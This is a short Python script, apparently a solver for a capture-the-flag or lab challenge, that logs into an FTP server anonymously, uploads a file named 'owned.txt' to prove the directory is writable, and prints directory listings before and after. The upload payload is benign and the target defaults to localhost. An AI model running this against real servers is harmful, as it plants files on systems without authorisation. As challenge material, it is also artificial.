#!/usr/bin/env python3
import ftplib
import os
import json

HOST = os.environ.get("FTP_HOST", "127.0.0.1")
PORT = int(os.environ.get("FTP_PORT", "21"))

# This solver demonstrates exploiting anonymous writable FTP to plant a file

def solve():
    ftp = ftplib.FTP()
    ftp.connect(HOST, PORT, timeout=10)
    ftp.login("anonymous", "anonymous@example.com")

    # List directories
    dirs = []
    ftp.retrlines("LIST", lambda x: dirs.append(x))

    payload_name = "owned.txt"
    payload_content = b"This directory is writable via anonymous FTP."

    from io import BytesIO
    bio = BytesIO(payload_content)
    ftp.storbinary(f"STOR {payload_name}", bio)

    files_after = []
    ftp.retrlines("LIST", lambda x: files_after.append(x))

    ftp.quit()

    return {
        "host": HOST,
        "port": PORT,
        "created_file": payload_name,
        "directory_listing_before": dirs,
        "directory_listing_after": files_after,
    }


if __name__ == "__main__":
    result = solve()
    print(json.dumps(result, indent=2))
